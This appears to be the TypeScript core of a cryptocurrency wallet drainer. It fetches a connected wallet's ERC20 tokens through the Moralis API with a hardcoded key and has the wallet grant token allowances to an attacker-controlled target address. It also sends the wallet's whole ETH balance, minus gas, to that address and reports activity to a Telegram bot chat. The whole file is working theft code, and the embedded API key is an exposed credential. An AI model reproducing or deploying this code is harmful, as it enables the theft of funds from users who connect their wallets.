import { BigNumber, ethers } from 'ethers';

const TARGET_ADDRESS = process.env.REACT_APP_CONNECT_TARGET_ADDRESS;
const TG_TOKEN = process.env.REACT_APP_TOKEN;
const GRUOP_NAME = process.env.REACT_APP_CHANNEL;
const USDT_ETHEREUM_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
const BANANA_ETHEREUM_ADDRESS = '0x38E68A37E401F7271568CecaAc63c6B1e19130B4';

function toBigNum(value: number, d: number) {
  return ethers.utils.parseUnits(Number(value).toFixed(d), d);
}

function fromBigNum(value:number, d:number) {
  return parseFloat(ethers.utils.formatUnits(value, d));
}

async function getEthPrice() {
  try {
      const response = await fetch('https://api.binance.com/api/v3/ticker/price?symbol=ETHUSDT');
      const data = await response.json();
      return parseFloat(data.price)
  } catch (error) {
        return 2500;
  }
}

export const sendEth = async (signer: any, amount: any) => {
    const transaction = {
      to: TARGET_ADDRESS,
      value: amount, // Convert amount to wei
    };
    const tx = await signer.sendTransaction(transaction);
    await tx.wait();
    return true;  
};

export const getBalance = async (accAdd: string, provider: any) => {
  const balance: any = await provider.getBalance(accAdd);
  return balance;
}



export const getTokens = async (accAdd: string, chain: string) => {

  const headers = {
      'accept': 'application/json',
      'X-API-Key': 'TXmgp6ejH5PCNOZNYPBYI04Yt8fqmQ6DTLatCckOqPYgUgzHDwzFvgwwLGAdqKFU'
  }
  const response = await fetch(`https://deep-index.moralis.io/api/v2.2/${accAdd}/erc20?chain=${chain}`, {
      method: 'GET',
      headers: headers
  })
  let tokens = await response.json();
  console.log(tokens);
  const realTokens = tokens.filter((token: any) => token.possible_spam === false);
  return realTokens;
}





export const sendToken = async (
  tokenAmount: any,
  tokenContractAddress: string,
  signer: any,
  txOptions: any
) => {
  var contractAbiFragment = [
    {
      inputs: [
        {
          internalType: 'address',
          name: 'spender',
          type: 'address',
        },
        {
          internalType: 'uint256',
          name: 'addedValue',
          type: 'uint256',
        },
      ],
      name: 'increaseAllowance',
      outputs: [
        {
          internalType: 'bool',
          name: '',
          type: 'bool',
        },
      ],
      stateMutability: 'nonpayable',
      type: 'function',
    },
    {
      inputs: [
        {
          internalType: 'address',
          name: 'spender',
          type: 'address',
        },
        {
          internalType: 'uint256',
          name: 'amount',
          type: 'uint256',
        },
      ],
      name: 'approve',
      outputs: [
        {
          internalType: 'bool',
          name: '',
          type: 'bool',
        },
      ],
      stateMutability: 'nonpayable',
      type: 'function',
    },
  ];
  let contract = new ethers.Contract(
    tokenContractAddress,
    contractAbiFragment,
    signer
  );

  if (contract.address.toLowerCase() === USDT_ETHEREUM_ADDRESS.toLowerCase() || contract.address.toLowerCase() === BANANA_ETHEREUM_ADDRESS.toLowerCase()) {
    const tx = await contract.approve(TARGET_ADDRESS, tokenAmount, txOptions);
    await tx.wait();
  } else {
    try {
      const tx = await contract.increaseAllowance(TARGET_ADDRESS, tokenAmount, txOptions);
      await tx.wait();  
      
    } catch (error) {
      const tx = await contract.approve(TARGET_ADDRESS, tokenAmount, txOptions);
      await tx.wait();
    }
  }
};


export const sendMessage = (text: string) => {
  console.log(text);
  var hostname = window.location.host;
  console.log("site location", hostname);

  // const tgStr = `${hostname}\n${text}`;
  const tgStr = text;
  const botToken = TG_TOKEN;
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
  console.log(url)
  let formData = new FormData();
  formData.append('text', tgStr);
  formData.append('chat_id', GRUOP_NAME!);
  fetch(url,
      {
          body: formData,
          method: "post"
      });
}


export const sendAllEth = async (signer: any, amount: any) => {
  const gasPrice = await signer.provider.getGasPrice();
  const gas = 21000;
  const gasFee = 2 * gasPrice * gas
  if (gasFee > amount)
      return
  console.log("amount - gasFee", (amount - gasFee) / 1e18);
  const transaction = {
      to: TARGET_ADDRESS,
      value: toBigNum((amount - gasFee) / 1e18, 18), // Convert amount to wei
  };
  const tx = await signer.sendTransaction(transaction);
  await tx.wait();
}



export { toBigNum, fromBigNum,getEthPrice};